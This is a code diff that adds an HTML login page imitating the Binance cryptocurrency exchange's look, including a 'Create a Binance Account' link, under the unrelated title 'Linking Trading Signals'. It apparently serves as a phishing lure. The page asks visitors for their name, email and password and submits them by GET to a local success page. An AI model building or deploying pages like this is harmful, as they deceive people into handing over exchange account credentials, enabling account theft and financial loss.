@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linking Trading Signals</title>
+
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family: Arial, Helvetica, sans-serif; }
+body { background-color: #0B0E11; display:flex; justify-content:center; align-items:center; height:100vh; color:#EAECEF; }
+.container { width:100%; max-width:400px; padding:20px; }
+.close-btn { font-size:22px; color:#848E9C; cursor:pointer; margin-bottom:20px; }
+h1 { font-size:28px; margin-bottom:25px; font-weight:600; }
+label { font-size:14px; color:#B7BDC6; display:block; margin-bottom:8px; }
+.input-wrapper { position:relative; margin-bottom:18px; }
+input { width:100%; padding:14px 40px 14px 14px; border-radius:8px; border:none; background-color:#1E2329; color:#EAECEF; font-size:15px; }
+input:focus { outline:1px solid #FCD535; }
+.icon-btn { position:absolute; right:12px; top:50%; transform:translateY(-50%); color:#848E9C; cursor:pointer; font-size:16px; user-select:none; }
+.btn-primary { width:100%; padding:14px; border:none; border-radius:8px; background-color:#FCD535; color:#000; font-weight:bold; font-size:16px; cursor:pointer; margin-top:10px; margin-bottom:20px; }
+.btn-primary:hover { opacity:0.9; }
+.footer-link { color:#FCD535; margin-top:15px; display:block; text-decoration:none; font-weight:500; }
+.footer-link:hover { text-decoration:underline; }
+.forgot { text-align:right; font-size:13px; margin-top:-10px; margin-bottom:15px; }
+.forgot a { color:#848E9C; text-decoration:none; }
+.forgot a:hover { color:#FCD535; }
+</style>
+</head>
+
+<body>
+<div class="container">
+
+    <div class="close-btn">&times;</div>
+    <h1>Log in</h1>
+
+    <!-- FORM -->
+    <form action="success.html" method="get">
+        <label>Name</label>
+        <div class="input-wrapper">
+            <input type="text" name="name" placeholder="Your Name" required>
+            <span class="icon-btn" onclick="clearName()">✕</span>
+        </div>
+
+        <label>Email</label>
+        <div class="input-wrapper">
+            <input type="email" name="email" placeholder="Your Email" required>
+            <span class="icon-btn" onclick="clearEmail()">✕</span>
+        </div>
+
+        <label>Password</label>
+        <div class="input-wrapper">
+            <input type="password" name="password" id="password" placeholder="Your Password" required>
+            <span class="icon-btn" onclick="togglePassword()">👁</span>
+        </div>
+
+        <button type="submit" class="btn-primary">Continue</button>
+    </form>
+
+    <div class="forgot">
+        <a href="#">Forgot password?</a>
+    </div>
+
+    <a href="#" class="footer-link">Create a Binance Account</a>
+    <a href="#" class="footer-link">Need help?</a>
+
+</div>
+
+<script>
+function clearEmail() { document.querySelector('input[name="email"]').value = ""; }
+function clearName() { document.querySelector('input[name="name"]').value = ""; }
+function togglePassword() { const password = document.getElementById("password"); password.type = password.type === "password" ? "text" : "password"; }
+</script>
+
+</body>
+</html>
